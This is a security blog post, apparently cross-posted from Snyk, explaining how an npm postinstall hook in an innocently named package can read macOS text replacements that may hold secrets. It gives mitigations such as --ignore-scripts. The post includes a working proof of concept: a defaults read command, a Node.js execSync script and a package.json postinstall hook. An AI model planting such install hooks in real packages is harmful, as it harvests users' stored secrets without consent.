@@ -1,0 +1,201 @@
+---
+title: 'Using insecure npm package manager defaults to steal your macOS keyboard shortcuts'
+description: >-
+  Node Package Manager (npm) provides a set of scripts for developers and package maintainers to maintain the life cycle events of a package.
+date: 2023-06-28
+tag: security
+status: published
+canonical_url: 'https://snyk.io/blog/using-insecure-npm-package-manager-defaults/'
+---
+
+> This article is originally available at [Snyk.io][snyk-blog].
+
+Malicious npm packages and their dangers have been a frequent topic of discussion — whether
+it’s [hundreds of command-and-control Cobalt Strike malware packages][cobalt-strike],
+[typosquatting][typosquatting], or general malware published to the npm registry
+(including PyPI and others). To help developers and maintainers defend against these security
+risks, [Snyk published a guide to npm security best practices][snyk-best-practices].
+
+All that said, the following attack scope, which Yagiz Nizipli alerted long-time maintainers to,
+and the real-world risk related to data compromise are a great example of how important it is to
+minimize the risks of arbitrary command execution with package managers, such as those employed
+via npm’s postinstall lifecycle hooks.
+
+## Life cycle scripts of npm
+
+Node Package Manager (npm) provides a set of scripts for developers and package maintainers to
+maintain the life cycle events of a package. These scripts provide significant value to
+developers by enabling them to perform various tasks or configurations as part of the package
+installation process. For example, with `postinstall` scripts, developers can automate tasks such
+as building assets, setting up environment variables, running migrations, or any tasks that can
+be automatically executed.
+
+The `scripts` property of a `package.json` file defines the commands triggered by the package's
+lifecycle and the dependent of the package you're developing. As of today, `npm` supports
+a limited number of life cycle scripts in any scripts property of a package.json file.
+
+For simplicity, the rest of this article will focus on the `postinstall` command. However, all concepts provided by this article also apply to other life cycle operations.
+
+## Past security incidents
+
+There have been several high-profile incidents that had a real-world impact on JavaScript developers, including:
+
+- The [cross-env](https://iamakulov.com/notes/npm-malicious-packages/) security incident discovered by Oscar Bolmsten.
+- The [eslint-scope security compromise](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/).
+- The [event-stream spear-headed attack](https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/) on cryptocurrency application developers.
+
+Many other JavaScript and Node.js security incidents are curated on the
+[Awesome Node.js Security repository][awesome-nodejs-security].
+
+## Data-at-rest Security
+
+Security professionals identify the protection of assets when the data is stored or at rest by
+`Data-at-rest`, as opposed to when it is in transit or being processed. It focuses on protecting
+the sensitive information stored in databases, file systems, or persistent storage. Data-at-rest
+security aims to prevent unauthorized access, disclosure, or data tampering while it is dormant.
+Various measures are available to ensure data-at-rest security, such as:
+
+- **On-demand decryption**: Decrypting only the data required to perform the current task and storing the rest of the data encrypted to prevent forbidden access.
+- **Access control logic**: Validating the requester's identity through a mechanism such as a password, two-factor authentication, or biometrics provided by an operating system (such as FaceID) — making it possible to limit the exposure of the resource to unwanted people.
+
+### Attack surface of a developer
+
+Industry best practices force us to use and follow principles to develop applications. These best practices offer many advantages when working with different teams and developers but also increase the attack surface.
+
+What sort of data is lying around unencrypted in a developer machine?
+
+- Environment variables through plain text files, such as .env (available for consumption through the dotenv package).
+- Configuration files for projects stored as a JSON file, such as config.json.
+- SSH keys for accessing Github/Gitlab, which are available in the ~/.ssh folder.
+- And... **macOS Keyboard Shortcuts**!
+
+## macOS Text Replacements
+
+macOS, by default, has a feature called `Text Replacements` hidden inside the system preferences
+applications. This feature allows users to quickly replace a word with another word. Just
+recently, I've learned that a developer from a well-known company was using text replacements
+to replace `@card` keyword with their credit card information. Even though the credit card number
+without the expiration date or CVV does not expose your money to outsiders, it adds an attack
+surface for them to exploit.
+
+![macOS Text Replacements](/content/macos-text-replacements.png)
+
+> Text Replacements feature is available through System Preferences application, under the `Keyboard` menu item.
+
+## Exfiltrating keyboard text replacements
+
+Keyboard shortcuts are stored under `defaults`, which corresponds to a filesystem backed `.plist`
+file somewhere in your local folder. Executing the following command will return your configured
+text replacements, which are also available through the System Preferences application.
+
+Remember that the following code does not require `sudo` access and can be executed by any
+process in your computer.
+
+```bash title="Reading text replacements"
+> defaults read -g NSUserDictionaryReplacementItems
+(
+  {
+    on = 1;
+    replace = "@ssh-key";
+    with = "my-secret-password";
+  }
+)
+```
+
+The same command can be executed through `execSync` in Node.js, and parsed without any hassle,
+through the `postinstall` life cycle operation supported by the `npm` package manager.
+
+The following is an example of a Node.js script that can be employed by malicious actors to
+access macOS text replacements and exfiltrate sensitive data:
+
+```js title="Retrieve text replacements"
+import { execSync } from 'node:child_process'
+
+const decoder = new TextDecoder()
+const res = execSync('defaults read -g NSUserDictionaryReplacementItems')
+const text_replacements = decoder.decode(res)
+
+console.log(text_replacements)
+```
+
+To make sure the above code runs when this package is installed, we will update the package
+manifest file as follows `package.json`:
+
+```json title="Exploiting the postinstall command"
+{
+  "name": "my-useful-library",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "type": "module",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "postinstall": "node ./retrieve.js"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC"
+}
+```
+
+When distributed through npm, and downloaded by a developer, this library will directly execute
+our custom script to retrieve and process the keyboard replacements. If you aren’t careful,
+it's easy to miss the line containing > node ./retrieve.js.
+
+```bash title="NPM install flow"
+➜  vulnerable npm i
+
+> my-useful-library@1.0.0 postinstall
+> node ./retrieve.js
+
+up to date, audited 1 package in 192ms
+
+found 0 vulnerabilities
+➜  vulnerable
+```
+
+## Protection
+
+What can you do as a developer to mitigate the security risks of malicious npm packages and
+general security concerns of arbitrary command execution from packages in your dependency tree?
+
+### Ignore scripts on npm package installations
+
+Protecting yourself from packages that leverage `postinstall` scripts is possible. npm
+provides `--ignore-scripts` configuration when installing packages.
+
+```bash title="Ignore all scripts"
+➜  npm i --ignore-scripts
+up to date, audited 1 package in 124ms
+found 0 vulnerabilities
+```
+
+### Use safe npm defaults
+
+NPM has a configuration file called [.npmrc](npmrc-documentation). You can change the default
+preferences using the `npm` CLI to ensure secure defaults:
+
+```bash title="Ignore all scripts by default"
+➜  npm config set ignore-scripts true
+➜  npm i
+up to date, audited 1 package in 126ms
+found 0 vulnerabilities
+```
+
+### Secure storage
+
+Most importantly, you should never store sensitive information in plain text. If you have to
+store it in plain text due to other requirements, you should always make the resource
+accessible through multi-factor authentication.
+
+---
+
+**Note**: Originally, I've written this article on [Snyk blog][snyk-blog] published by Liran Tal.
+
+[awesome-nodejs-security]: https://github.com/lirantal/awesome-nodejs-security
+[cobalt-strike]: https://snyk.io/blog/snyk-200-malicious-npm-packages-cobalt-strike-dependency-confusion-attacks/
+[typosquatting]: https://snyk.io/blog/typosquatting-attacks/
+[snyk-best-practices]: https://snyk.io/blog/ten-npm-security-best-practices/
+[npm-scripts-documentation]: https://docs.npmjs.com/cli/v9/using-npm/scripts
+[npmrc-documentation]: https://docs.npmjs.com/cli/v9/configuring-npm/npmrc
+[snyk-blog]: https://snyk.io/blog/using-insecure-npm-package-manager-defaults/
